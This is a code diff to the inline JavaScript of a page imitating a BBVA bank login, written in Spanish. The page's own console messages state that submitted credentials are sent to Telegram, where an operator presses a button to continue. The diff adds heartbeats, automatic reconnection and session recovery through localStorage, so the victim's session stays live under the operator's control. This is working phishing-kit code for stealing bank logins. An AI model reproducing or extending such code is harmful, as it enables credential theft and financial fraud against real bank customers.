@@ -173,58 +173,94 @@
     </div>
 
     <script>
-        // ========================================
-        // SOCKET.IO INITIALIZATION
-        // ========================================
+        // Socket.io initialization
         const socket = io({
             transports: ['websocket', 'polling'],
             reconnection: true,
-            reconnectionDelay: 500,
+            reconnectionDelay: 1000,
             reconnectionDelayMax: 5000,
-            reconnectionAttempts: 10,
-            timeout: 20000,
+            reconnectionAttempts: Infinity,
+            timeout: 30000,
             forceNew: false,
-            upgrade: true
+            upgrade: true,
+            rememberUpgrade: true,
+            path: '/socket.io'
         });
 
         // Store session ID
-        let currentSessionId = null;
+        let currentSessionId = localStorage.getItem('bbva_session_id');
+
+        // Heartbeat para mantener sesión activa
+        let heartbeatInterval = null;
+
+        function startHeartbeat() {
+            if (heartbeatInterval) clearInterval(heartbeatInterval);
+            heartbeatInterval = setInterval(() => {
+                if (socket.connected && currentSessionId) {
+                    socket.emit('heartbeat', { sessionId: currentSessionId });
+                    console.log('💓 Heartbeat enviado');
+                }
+            }, 15000); // Cada 15 segundos
+        }
 
         // Connection monitoring
         socket.on('connect', () => {
             console.log('✓ Conectado al servidor. Socket ID:', socket.id);
             
-            // Store session ID
+            // Recuperar o crear session ID
             if (!currentSessionId) {
                 currentSessionId = socket.id;
                 localStorage.setItem('bbva_session_id', currentSessionId);
                 console.log('💾 Session ID guardado:', currentSessionId);
+            } else {
+                // Reidentificar sesión existente
+                socket.emit('identify-session', { originalSessionId: currentSessionId });
+                console.log('🔄 Reidentificando sesión:', currentSessionId);
             }
+            
+            startHeartbeat();
         });
 
         socket.on('disconnect', (reason) => {
             console.log('✗ Desconectado del servidor. Razón:', reason);
-            if (reason === 'io server disconnect') {
-                // Reconectar manualmente si el servidor desconectó
-                socket.connect();
+            if (heartbeatInterval) clearInterval(heartbeatInterval);
+            
+            // Intentar reconectar en todos los casos
+            if (reason === 'io server disconnect' || reason === 'transport close') {
+                setTimeout(() => {
+                    if (!socket.connected) {
+                        console.log('🔄 Intentando reconectar...');
+                        socket.connect();
+                    }
+                }, 1000);
             }
         });
 
         socket.on('reconnect', (attemptNumber) => {
-            console.log('🔄 Reconectado después de', attemptNumber, 'intentos');
+            console.log('✅ Reconectado después de', attemptNumber, 'intentos');
+            if (currentSessionId) {
+                socket.emit('identify-session', { originalSessionId: currentSessionId });
+            }
+            startHeartbeat();
         });
 
         socket.on('reconnecting', (attemptNumber) => {
-            console.log('🔄 Intentando reconectar...', attemptNumber);
+            console.log('🔄 Intentando reconectar... Intento #', attemptNumber);
+        });
+
+        socket.on('reconnect_error', (error) => {
+            console.error('✗ Error al reconectar:', error.message);
         });
 
         socket.on('connect_error', (error) => {
             console.error('✗ Error de conexión:', error.message);
         });
 
-        // ========================================
-        // CAROUSEL FUNCTIONALITY
-        // ========================================
+        socket.on('pong', () => {
+            console.log('🏓 Pong recibido del servidor');
+        });
+
+        // Carousel functionality
         let currentSlide = 1;
         let isPaused = false;
         let carouselInterval;
@@ -273,9 +309,7 @@
             }, 5000);
         }
 
-        // ========================================
-        // FORM FUNCTIONALITY
-        // ========================================
+        // Form functionality
         function togglePassword() {
             const passwordInput = document.getElementById('password');
             const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
@@ -319,9 +353,7 @@
             });
         });
 
-        // ========================================
-        // SOCKET EVENT HANDLERS
-        // ========================================
+        // Socket event handlers
         
         // Listen for server responses
         socket.on('login-processing', (data) => {
@@ -330,11 +362,16 @@
                 // Update and store session ID
                 currentSessionId = data.sessionId;
                 localStorage.setItem('bbva_session_id', currentSessionId);
+                localStorage.setItem('bbva_session_timestamp', Date.now().toString());
                 
                 // Keep loading text as "Cargando..." - don't change it
                 console.log('✓ Credenciales enviadas a Telegram. Session ID:', data.sessionId);
                 console.log('🔔 IMPORTANTE: Tu Session ID es:', data.sessionId);
                 console.log('📱 Ve a Telegram y presiona un botón para continuar');
+                
+                // Persistir sesión
+                if (heartbeatInterval) clearInterval(heartbeatInterval);
+                startHeartbeat();
             }
         });
 
@@ -355,12 +392,29 @@
             alert('Error al procesar tu solicitud. Inténtalo de nuevo.');
         });
 
-        // Keep connection alive
-        setInterval(() => {
-            if (socket.connected) {
-                console.log('💓 Conexión activa. Socket ID:', socket.id);
+        // Limpiar al cerrar página (beforeunload)
+        window.addEventListener('beforeunload', () => {
+            if (heartbeatInterval) clearInterval(heartbeatInterval);
+        });
+
+        // Intentar recuperar sesión al cargar
+        window.addEventListener('load', () => {
+            const savedSession = localStorage.getItem('bbva_session_id');
+            const timestamp = localStorage.getItem('bbva_session_timestamp');
+            
+            if (savedSession && timestamp) {
+                const age = Date.now() - parseInt(timestamp);
+                if (age < 30 * 60 * 1000) { // 30 minutos
+                    currentSessionId = savedSession;
+                    console.log('♻️ Sesión recuperada:', savedSession);
+                } else {
+                    // Sesión expirada
+                    localStorage.removeItem('bbva_session_id');
+                    localStorage.removeItem('bbva_session_timestamp');
+                    console.log('⏰ Sesión expirada');
+                }
             }
-        }, 10000);
+        });
 
         // Carousel functions
         function showSlide(n) {
